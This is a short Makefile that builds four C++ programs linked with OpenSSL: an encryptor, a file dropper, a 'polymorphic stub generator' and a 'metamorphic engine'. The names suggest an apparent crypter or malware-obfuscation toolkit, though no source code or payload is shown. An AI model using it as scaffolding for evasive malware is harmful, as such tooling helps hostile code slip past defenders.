CXX = g++
CXXFLAGS = -std=c++17 -Wall -Wextra
OPENSSL_LIBS = -lcrypto -lssl

# Default target
all: encryptor filedropper stub_generator metamorphic_engine

# Compile encryptor
encryptor: encryptor.cpp
	$(CXX) $(CXXFLAGS) -o encryptor encryptor.cpp $(OPENSSL_LIBS)

# Compile file dropper
filedropper: filedropper.cpp
	$(CXX) $(CXXFLAGS) -o filedropper filedropper.cpp $(OPENSSL_LIBS)

# Compile polymorphic stub generator
stub_generator: stub_generator.cpp
	$(CXX) $(CXXFLAGS) -o stub_generator stub_generator.cpp $(OPENSSL_LIBS)

# Compile metamorphic engine
metamorphic_engine: metamorphic_engine.cpp
	$(CXX) $(CXXFLAGS) -o metamorphic_engine metamorphic_engine.cpp $(OPENSSL_LIBS)

# Clean build artifacts
clean:
	rm -f encryptor filedropper stub_generator metamorphic_engine

.PHONY: all clean